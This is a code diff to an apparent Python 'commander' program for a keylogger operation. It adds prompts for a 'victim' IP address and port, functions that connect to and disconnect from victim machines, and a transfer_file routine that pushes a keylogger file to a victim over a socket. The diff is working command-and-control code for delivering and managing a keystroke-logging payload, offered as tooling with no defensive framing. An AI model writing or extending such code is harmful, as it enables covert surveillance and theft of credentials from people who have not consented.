@@ -18,6 +18,8 @@ def display_menu():
     print(constants.MENU_ITEM_NINE)
     print(constants.MENU_ITEM_TEN)
     print(constants.MENU_ITEM_ELEVEN)
+    print(constants.MENU_ITEM_TWELVE)
+    print(constants.MENU_ITEM_THIRTEEN)
     print(constants.MENU_CLOSING_BANNER)
 
 
@@ -32,6 +34,7 @@ def get_menu_selection():
             print(constants.INVALID_INPUT_MENU_ERROR.format(e))
 
     print(constants.MENU_ACTION_START_MSG.format(choice))
+    print(constants.MENU_CLOSING_BANNER)
     return choice
 
 
@@ -121,10 +124,8 @@ def initialize_server_socket(source_ip: str, source_port: int):
         sys.exit(constants.COMMANDER_SERVER_SOCKET_CREATION_ERROR_MSG.format(str(e)))
 
 
-def connect_to_client(sockets_list: list,
-                      connected_clients: dict,
-                      dest_ip: str,
-                      dest_port: int):
+def initial_connect_to_client(sockets_list: list, connected_clients: dict,
+                              dest_ip: str, dest_port: int):
     try:
         # Create a new client socket and initiate the connection
         print(constants.INITIATE_VICTIM_CONNECTION_MSG)
@@ -135,31 +136,131 @@ def connect_to_client(sockets_list: list,
         # Add the new client socket to the connected_clients dictionary (Key/Value pair)
         connected_clients[target_socket] = (dest_ip, dest_port)
         sockets_list.append(target_socket)
+        return True, target_socket
+
     except Exception as e:
         print(constants.ERROR_VICTIM_CONNECTION_MSG.format(str(e)))
+        return False, None
 
 
-def disconnect_from_client(sockets_list: list, connected_clients: dict,
-                           dest_ip: str, dest_port: int):
-    # INITIAL CHECK: if client is present in connected_clients list
-    if (dest_ip, dest_port) in connected_clients.values():
-        print(constants.DISCONNECT_FROM_VICTIM_MSG.format((dest_ip, dest_port)))
+def connect_to_client_with_prompt(sockets_list: list, connected_clients: dict):
+    try:
+        # Prompt user input
+        try:
+            target_ip = str(ipaddress.ip_address(input("[+] Enter victim IP address: ")))
+            target_port = int(input("[+] Enter victim port: "))
+        except ValueError as e:
+            print(constants.INVALID_INPUT_ERROR.format(e))
+            return False, None, None, None
 
-        for client_sock, (ip, port) in connected_clients.items():
-            if ip == dest_ip and port == dest_port:
-                target_socket = client_sock
+        # Create a new client socket and initiate the connection
+        print(constants.INITIATE_VICTIM_CONNECTION_MSG)
+        target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        target_socket.connect((target_ip, target_port))
+        print(constants.SUCCESSFUL_VICTIM_CONNECTION_MSG.format((target_ip, target_port)))
 
-                # Remove client from both socket and connected_clients list
-                sockets_list.remove(target_socket)
-                del connected_clients[target_socket]
+        # Add the new client socket to the connected_clients dictionary (Key/Value pair)
+        connected_clients[target_socket] = (target_ip, target_port)
+        sockets_list.append(target_socket)
+        return True, target_socket, target_ip, target_port
 
-                # Close socket
-                target_socket.close()
+    except Exception as e:
+        print(constants.ERROR_VICTIM_CONNECTION_MSG.format(str(e)))
+        return False, None, None, None
 
-                print(constants.DISCONNECT_FROM_VICTIM_SUCCESS)
-                break
-    else:
+
+def disconnect_from_client(sockets_list: list, connected_clients: dict):
+    # CHECK: If connected_clients is empty
+    if len(connected_clients) == constants.ZERO:
         print(constants.DISCONNECT_FROM_VICTIM_ERROR)
+    else:
+        # Get prompt for target ip and port
+        try:
+            target_ip = str(ipaddress.ip_address(input(constants.ENTER_TARGET_IP_DISCONNECT_PROMPT)))
+            target_port = int(input(constants.ENTER_TARGET_PORT_DISCONNECT_PROMPT))
+
+            # CHECK: if client is present in connected_clients list
+            if (target_ip, target_port) in connected_clients.values():
+                print(constants.DISCONNECT_FROM_VICTIM_MSG.format((target_ip, target_port)))
+
+                for client_sock, (ip, port) in connected_clients.items():
+                    if ip == target_ip and port == target_port:
+                        target_socket = client_sock
+
+                        # Remove client from both socket and connected_clients list
+                        sockets_list.remove(target_socket)
+                        del connected_clients[target_socket]
+
+                        # Close socket
+                        target_socket.close()
+
+                        print(constants.DISCONNECT_FROM_VICTIM_SUCCESS)
+                        break
+            else:
+                print(constants.DISCONNECT_FROM_VICTIM_ERROR)
+        except ValueError as e:
+            print(constants.INVALID_INPUT_ERROR.format(e))
+
+
+def transfer_file(sock: socket.socket,
+                  dest_ip: str,
+                  dest_port: int):
+    # Send to victim a notification that it is transferring a file
+    sock.send(constants.TRANSFER_KEYLOG_MSG.encode())
+    ack = sock.recv(1024).decode()
+
+    if ack == constants.RECEIVED_CONFIRMATION_MSG:
+        # Send file name
+        sock.send(constants.KEYLOG_FILE_NAME.encode())
+        print(constants.FILE_NAME_TRANSFER_MSG.format(constants.KEYLOG_FILE_NAME))
+
+        # Open and Read the file to be sent
+        with open(constants.KEYLOG_FILE_NAME, 'rb') as file:
+            while True:
+                data = file.read(1024)
+                if not data:
+                    break
+                sock.send(data)
+
+        # Send EOF signal to prevent receiver's recv() from blocking
+        sock.send(constants.END_OF_FILE_SIGNAL)
+
+        # Get an ACK from victim for success
+        transfer_result = sock.recv(1024).decode()
+
+        if transfer_result == constants.VICTIM_ACK:
+            print(constants.FILE_TRANSFER_SUCCESSFUL.format(constants.KEYLOG_FILE_NAME,
+                                                            dest_ip,
+                                                            dest_port))
+        else:
+            print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
+
+
+def find_specific_client_socket(client_dict: dict,
+                                target_ip: str,
+                                target_port: int):
+    try:
+        # Initialize Variables
+        target_socket = None
+
+        # Check target_ip and target_port
+        ipaddress.ip_address(target_ip)
+
+        # Find a specific client socket from client socket list to send data to
+        for client_sock, (ip, port) in client_dict.items():
+            if ip == target_ip and port == target_port:
+                target_socket = client_sock
+                break
+
+        # Check if target_socket is not None and return
+        if target_socket:
+            return target_socket, target_ip, target_port
+        else:
+            return None, None, None
+
+    except ValueError as e:
+        print(constants.INVALID_INPUT_ERROR.format(e))
+        return None, None, None
 
 
 if __name__ == '__main__':
